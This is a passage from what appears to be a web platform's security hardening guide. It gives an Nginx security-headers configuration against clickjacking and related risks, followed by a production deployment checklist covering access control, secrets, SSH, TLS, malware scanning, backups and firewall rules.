```

* **Priority**: **High**

---

## 📁 18. Security Headers

### Risk
Exposure to clickjacking, cross-site scripting (XSS), and data leakage from referrers.

### Attack Scenario
An attacker embeds the platform in a transparent iframe on their website, tricking users into clicking buttons (clickjacking) to leave teams or delete submissions.

### Recommended Mitigation
Implement secure response headers in the Nginx configuration, preventing frame loading, script injection, and MIME sniffing.

### Example Configuration (Nginx Security Headers `/etc/nginx/conf.d/security.conf`)
```nginx
# Prevent Frame nesting (Clickjacking)
add_header X-Frame-Options "DENY" always;

# Prevent MIME type sniffing
add_header X-Content-Type-Options "nosniff" always;

# Enable XSS protection filter
add_header X-XSS-Protection "1; mode=block" always;

# Strict Referrer policy
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Strict Transport Security (HSTS) - 2 years validity
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# Permissions Policy (restrict client APIs)
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;
```

* **Priority**: **High**

---

## 📋 19. Production Deployment Checklist

Perform these checks before the platform goes live for registration:

- [ ] **Auth**: Supabase RLS is enabled on all tables and validated with testing queries.
- [ ] **Secrets**: Verify that `SUPABASE_SERVICE_ROLE_KEY` is not present in Next.js public client bundles.
- [ ] **SSH**: Enforced key-based SSH authentication and moved port to `2222` on the VM.
- [ ] **SSL**: HTTPS certificates (Certbot) are active and auto-renewal is tested.
- [ ] **Nginx**: Upload limit (`client_max_body_size 250M`) and security headers are active.
- [ ] **Local Storage**: Storage directory is placed outside the webserver's execution path with `chmod 775` permissions.
- [ ] **Malware**: ClamAV daemon is running and scanning uploads on the backend.
- [ ] **Rate Limiter**: Rate limit zones are active in Nginx and tested.
- [ ] **Audit Trail**: Audit triggers are active and verified.
- [ ] **Backups**: Script `backup.sh` is running daily as a system cron job.
- [ ] **DB Pruning**: Configured a `pg_cron` schedule or background task to clean expired notifications and audit deltas to stay within the **500MB free database limits**.
- [ ] **UFW**: Disabled all port access on the firewall except 80, 443, and 2222.
- [ ] **Zod Validation**: Input validation schemas are active on all public API endpoints.
